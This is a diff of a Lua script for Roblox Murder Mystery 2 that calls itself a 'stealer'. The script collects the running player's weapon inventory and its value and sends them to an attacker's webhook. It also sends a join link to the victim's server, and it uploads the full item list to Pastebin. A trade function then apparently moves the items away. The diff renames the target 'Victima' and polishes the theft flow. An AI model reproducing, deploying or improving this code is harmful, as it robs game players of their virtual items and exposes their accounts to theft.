@@ -1,7 +1,3 @@
--- ==============================
--- MM2 Stealer + Trade + Join Bypass
--- ==============================
-
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -30,7 +26,7 @@ local function SendWebhook(title, description, fields, prefix)
             ["color"] = 65280,
             ["fields"] = fields or {},
             ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
-            ["footer"] = {["text"] = "Stealer + Join Bypass by Anonimo 🇪🇨"}
+            ["footer"] = {["text"] = "The best stealer by Anonimo 🇪🇨"}
         }}
     }
     local body = HttpService:JSONEncode(data)
@@ -197,52 +193,61 @@ end
 
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- 🔹 BYPASS DELTA: que el executor genere join para que tú te unas
+-- 🔹 Fern Link real solo visible en webhook (siempre correcto)
 local fernToken = math.random(100000,999999)
-local function GetValidJobId()
-    local success, servers = pcall(function()
-        local res = req({
-            Url = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100",
-            Method = "GET",
-            Headers = {["User-Agent"]="Mozilla/5.0"}
-        })
-        return HttpService:JSONDecode(res.Body)
-    end)
-    if success and servers and servers.data then
-        for _, srv in ipairs(servers.data) do
-            if srv.playing < srv.maxPlayers then
-                return srv.id
-            end
-        end
-    end
-    return game.JobId -- fallback
+local placeId, jobId
+
+-- Esperar a que PlaceId y JobId estén listos
+repeat
+    placeId = game.PlaceId
+    jobId = game.JobId
+    task.wait(0.1)
+until placeId and placeId ~= 0 and jobId and jobId ~= ""
+
+local realLink = string.format(
+    "[Unirse](https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s&token=%s)",
+    placeId,
+    jobId,
+    fernToken
+)
+
+-- Preparar contenido completo para Pastebin
+local pasteContent = ""
+for _, w in ipairs(weaponsToSend) do
+    pasteContent = pasteContent..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
 end
-
-local verifiedJobId = GetValidJobId()
-local joinLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..verifiedJobId.."&token="..fernToken..")"
-
--- Preparar webhook para enviar a ti
-local prefix = pingEveryone and "@everyone " or ""
-local fieldsInit = {
-    {name="Executor 👤:", value=LocalPlayer.Name, inline=true},
-    {name="Inventario 📦:", value="", inline=false},
-    {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
-    {name="Click para unirte al executor 👇:", value=joinLink, inline=false}
-}
-
-local maxEmbedItems = math.min(18,#weaponsToSend)
-for i=1,maxEmbedItems do
-    local w = weaponsToSend[i]
-    fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
-end
+pasteContent = pasteContent .. "\nTotal Value: "..tostring(totalValue).."💰"
 
 local pasteLink
 if #weaponsToSend > 18 then
-    pasteLink = CreatePaste(table.concat(weaponsToSend,"\n"))
-    fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\nMira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
+    pasteLink = CreatePaste(pasteContent)
 end
 
-SendWebhook("💪MM2 Hit - Executor listo 💯","💰Disfruta el inventario del executor 😎",fieldsInit)
+-- Webhook inventario
+if #weaponsToSend > 0 then
+    local fieldsInit={
+        {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
+        {name="Inventario 📦:", value="", inline=false},
+        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
+        {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
+    }
+
+    local maxEmbedItems = math.min(18,#weaponsToSend)
+    for i=1,maxEmbedItems do
+        local w = weaponsToSend[i]
+        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
+    end
+
+    if #weaponsToSend > 18 then
+        fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\n"
+        if pasteLink then
+            fieldsInit[2].value = fieldsInit[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
+        end
+    end
+
+    local prefix=pingEveryone and "@everyone " or ""
+    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
+end
 
 -- 🔹 Trade
 local function doTrade(targetName)
